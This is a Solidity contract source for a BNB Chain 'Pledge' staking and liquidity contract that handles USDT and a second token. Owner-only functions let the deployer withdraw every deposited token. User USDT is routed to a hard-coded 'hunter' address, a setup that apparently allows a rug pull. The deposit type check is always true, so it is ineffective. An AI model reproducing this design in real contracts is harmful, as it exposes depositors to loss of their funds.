/**
 *Submitted for verification at BscScan.com on 2022-05-13
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);
}

contract USDTERC20 {
    IERC20 public token = IERC20(0x55d398326f99059fF775485246999027B3197955);

    function uTransferFrom(
        address _from,
        address _to,
        uint256 _amount
    ) internal {
        token.transferFrom(_from, _to, _amount);
    }

    function uTransfer(address _to, uint256 _amount) internal {
        token.transfer(_to, _amount);
    }

    function uApprove(address _to, uint256 _amount) internal {
        token.approve(_to, _amount);
    }

    function uAllowance(address owner, address spender)
        internal
        view
        returns (uint256)
    {
        return token.allowance(owner, spender);
    }
}

contract SUERC20 {
    IERC20 public tokens = IERC20(0x7a42A027Ffcb4c6b193170747a0a30196F1A22D1);

    function tTransferFrom(
        address _from,
        address _to,
        uint256 _amount
    ) internal {
        tokens.transferFrom(_from, _to, _amount);
    }

    function tTransfer(address _to, uint256 _amount) internal {
        tokens.transfer(_to, _amount);
    }

    function tApprove(address _to, uint256 _amount) internal {
        tokens.approve(_to, _amount);
    }

    function tAllowance(address owner, address spender)
        internal
        view
        returns (uint256)
    {
        return tokens.allowance(owner, spender);
    }
}

interface IPancakePair {
    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );
}

contract PancakePair {
    IPancakePair public pairs =IPancakePair(0xa07fA9e1345a0A41ce30Dbb9081AF7EDEF2a9538);

    function reserve()
        public
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        )
    {
        return pairs.getReserves();
    }
}

interface IPancakeRouter {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );
}

contract Pledge is USDTERC20, SUERC20, PancakePair, Ownable {

    mapping(address => uint256) public _balances;
    address public hunter =0xb0d87B35C426Ce4D575B5E209Ae0a086EbceDCA1;



    event AddPool(address from, uint256 tAmount,uint256 uAmount );
    event RemovePool(address from,uint256 tAmount , uint256 uAmount);
    event Deposit(address from, uint256 amount, uint256 _type);

    event Recharge(address from, uint256 amount);
    event Remove(address to, uint256 amount);

    function addLiquiditys(uint256 lpToken0, uint256 lpToken1) external {
        tTransferFrom(msg.sender, address(this), lpToken0);
        uTransferFrom(msg.sender, address(this), lpToken1);
      
        emit AddPool(msg.sender, lpToken0, lpToken1);
    }

    function removeLiquiditys(
        uint256 lpToken0,
        uint256 lpToken1,
        address to
    ) external onlyOwner {
        tTransfer(to, lpToken0);
        uTransfer(to, lpToken1);
        emit RemovePool(to, lpToken0, lpToken1);
    }
    
    function deposit(uint256 _amount, uint256 _type) external {
        require(_type != 1 || _type != 2, "dataType error");
        tTransferFrom(msg.sender, address(this), _amount);
        emit Deposit(msg.sender, _amount, _type);
    }

    function drawUsdt(uint256 _amount) external onlyOwner {
        uTransfer(msg.sender, _amount);
    }
    function drawSu(uint256 _amount) external onlyOwner {
        tTransfer(msg.sender, _amount);
    }


    function  retreat(uint256 amount) external {
        uTransferFrom(msg.sender,hunter, amount);
        _balances[msg.sender]+= amount;
        emit Recharge(msg.sender, amount);
    }

   function  remove() external {
        require(_balances[msg.sender] >0, "ERC20: transfer amount exceeds balance");
        uTransfer(msg.sender, _balances[msg.sender]/100*95);
        emit Remove(msg.sender,_balances[msg.sender]);
        _balances[msg.sender]= 0;
    }
}